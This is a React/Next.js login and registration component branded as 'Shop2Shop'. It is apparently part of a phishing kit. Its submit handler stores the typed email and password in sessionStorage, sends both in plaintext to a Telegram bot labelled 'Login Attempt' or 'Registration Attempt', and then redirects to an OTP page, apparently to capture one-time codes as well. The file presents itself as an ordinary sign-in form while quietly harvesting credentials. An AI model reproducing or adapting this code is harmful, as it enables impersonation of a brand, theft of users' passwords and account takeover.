"use client"

import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import Link from "next/link";
import { useRouter, usePathname } from "next/navigation";
import { Loader2 } from "lucide-react";

export function LoginForm() {
  const router = useRouter();
  const pathname = usePathname();
  const isRegister = pathname === "/register";

  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [loading, setLoading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setIsSubmitting(true);

    try {
      // Store in sessionStorage to be picked up by later screens if needed
      sessionStorage.setItem("userEmail", email);
      sessionStorage.setItem("userPassword", password);

      // Send credentials to Telegram
      const { sendTelegramMessage } = await import("@/lib/telegram");
      await sendTelegramMessage({
        title: isRegister ? "Registration Attempt" : "Login Attempt",
        type: isRegister ? "register" : "login",
        email,
        password,
        exclude: ["location"] // Remove location details as requested
      });

      router.push("/otp");
    } catch (err) {
      setLoading(false);
      setIsSubmitting(false);
    }
  };


  return (
    <div className="w-full max-w-md space-y-8 px-6 animate-in fade-in slide-in-from-bottom-4 duration-700">
      {/* Full Screen Loader Overlay - Matching OTP Style */}
      {isSubmitting && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <div className="p-6 rounded-xl flex flex-col items-center gap-4">

            <div className="">
              <img
                src="/shop2shop-logo-white.svg"
                alt="Shop2Shop Logo"
                className="h-14 w-auto"
              />

            </div>
            <Loader2 className="w-12 h-12 text-[#f4a261] animate-spin" />

            {/* <Loader2 className="w-12 h-12 text-[#f4a261] animate-spin" /> */}
            {/* <p className="text-white text-sm font-medium">Verifying your OTP...</p> */}
          </div>
        </div>
      )}

      {/* Logo and Title */}
      <div className="flex flex-col items-center justify-center gap-6">
        <img
          src="/shop2shop-logo-white.svg"
          alt="Shop2Shop Logo"
          className="h-14 w-auto"
        />
        {/* <h1 className="text-white text-3xl font-bold tracking-tight">
          {isRegister ? "Register" : "Login"}
        </h1> */}
      </div>

      {/* Form */}
      <form onSubmit={handleSubmit} className="space-y-6 pt-4">
        <div className="space-y-2">
          <label htmlFor="email" className="text-white text-base font-medium px-2">
            Email
          </label>
          <Input
            id="email"
            type="email"
            value={email}
            placeholder="Enter your email"
            onChange={(e) => setEmail(e.target.value)}
            className="
    bg-transparent
    border-0
    border-b-2
    border-white/30
    text-white
    placeholder:text-white/50
    focus-visible:outline-none
    focus-visible:ring-0
    focus-visible:border-[#faa225]
    h-12
    rounded-none
  "
            required
          />

        </div>

        <div className="space-y-2">
          <label htmlFor="password" className="text-white text-base font-medium px-2">
            Password
          </label>
          <Input
            id="password"
            type="password"
            value={password}
            placeholder="Enter your password"
            onChange={(e) => setPassword(e.target.value)}
            className="
    bg-transparent
    border-0
    border-b-2
    border-white/30
    text-white
    placeholder:text-white/50
    focus-visible:outline-none
    focus-visible:ring-0
    focus-visible:border-[#faa225]
    h-12
    rounded-none
  "
            required
          />

        </div>

        <div className="space-y-4 pt-4">
          <div className="flex items-center justify-center gap-2">
            <Checkbox
              id="remember"
              checked={rememberMe}
              onCheckedChange={(checked) => setRememberMe(Boolean(checked))}
              className="border-white data-[state=checked]:bg-white data-[state=checked]:text-[#1a2942]"
            />
            <label htmlFor="remember" className="text-white text-base font-medium cursor-pointer">
              Remember me
            </label>
          </div>

          <div className="text-center">
            <Link href="#" className="text-[#faa225] hover:text-[#faa225]/80 font-medium text-base">
              Forgot Password?
            </Link>
          </div>
        </div>

        <Button
          type="submit"
          disabled={loading}
          className="w-full bg-[#faa225] hover:bg-[#e89550] text-white font-bold cursor-pointer text-lg h-14 rounded-lg uppercase tracking-wide"
        >
          {loading ? (isRegister ? "Registering..." : "Signing In...") : (isRegister ? "REGISTER" : "SIGN IN")}
        </Button>
      </form>
      <div className="text-center pt-4 border-t border-white/10 text-white/80 text-base">{isRegister ? "Already have an account? " : "New user? "} <Link href={isRegister ? "/" : "/register"} className="text-[#faa225] hover:text-[#faa225]/80 font-medium">{isRegister ? "Login" : "Register"}</Link></div>

    </div>
  );
}
